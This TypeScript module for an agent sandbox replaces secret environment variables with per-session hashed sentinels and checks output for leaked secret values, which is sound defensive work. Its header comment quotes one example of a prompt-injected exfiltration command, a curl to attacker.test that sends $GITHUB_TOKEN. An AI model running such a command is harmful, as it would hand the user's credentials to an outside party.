import { createHash } from 'node:crypto';

/**
 * Masked credentials for the sandboxed process (P1-SEC-03, ADR-0036).
 *
 * ADR-0027 named "daemon-scoped credentials" as a principle and did not specify
 * a mechanism. This is the mechanism: the sandboxed process holds a per-session
 * **sentinel**, never the real secret, and the real value is substituted back in
 * only at an egress point that has checked the destination.
 *
 * The property that makes it worth doing: a command that exfiltrates its whole
 * environment exfiltrates sentinels. A prompt-injected `curl attacker.test -d
 * "$GITHUB_TOKEN"` sends a string that is worthless anywhere else. That is a
 * different kind of protection from "we told the agent not to" — it holds
 * whatever the model decided to run.
 *
 * **What v0.1 ships is the masking half, and it says so.** Substituting the
 * secret back in requires a TLS-terminating egress proxy with a domain
 * allowlist; that proxy is not built. So masking is useful *today* for
 * credentials the sandboxed command does not actually need — which is most of
 * them — and honest about the rest: a command that genuinely needs the token
 * gets a sentinel and fails, visibly, rather than silently receiving the real
 * value.
 */

/** Distinctive by design: a sentinel that appears in a log should be obviously not-a-secret. */
export const SENTINEL_PREFIX = 'sdlcof-masked-';

export interface MaskedEnv {
  /** The environment to hand the child, with masked values replaced. */
  readonly env: Readonly<Record<string, string>>;
  /** Sentinel → the variable it stands for, so an egress proxy could reverse it. */
  readonly sentinels: Readonly<Record<string, string>>;
  /** Names asked to be masked that were not present. Reported, not silently ignored. */
  readonly absent: readonly string[];
}

/**
 * Replaces named environment variables with per-session sentinels.
 *
 * The sentinel is derived from the session id and the variable name, so it is
 * stable within a run (a command that reads the value twice sees one value) and
 * different across runs (a sentinel captured from a log is useless later). It is
 * a hash, not the secret — deriving it from the secret itself would put a
 * verifiable fingerprint of the credential in every log line it reached.
 */
export function maskEnvironment(
  source: Readonly<Record<string, string | undefined>>,
  maskNames: readonly string[],
  sessionId: string,
): MaskedEnv {
  const env: Record<string, string> = {};
  const sentinels: Record<string, string> = {};
  const absent: string[] = [];

  for (const [key, value] of Object.entries(source)) {
    if (value !== undefined) env[key] = value;
  }

  for (const name of maskNames) {
    if (source[name] === undefined) {
      absent.push(name);
      continue;
    }
    const sentinel =
      SENTINEL_PREFIX +
      createHash('sha256').update(`${sessionId}:${name}`, 'utf8').digest('hex').slice(0, 24);
    env[name] = sentinel;
    sentinels[sentinel] = name;
  }

  return { env, sentinels, absent };
}

/**
 * Whether a string still contains a real secret from the masked set.
 *
 * For asserting the masking worked, and for refusing to record output that
 * leaked one. Comparing against the *values* is the only reliable check — a
 * command can print a credential without ever naming the variable it came from.
 */
export function containsSecret(
  text: string,
  source: Readonly<Record<string, string | undefined>>,
  maskNames: readonly string[],
): boolean {
  return maskNames.some((name) => {
    const value = source[name];
    // Short values are excluded: a two-character "secret" would match almost any
    // output and turn this into a permanent false alarm.
    return value !== undefined && value.length >= 8 && text.includes(value);
  });
}
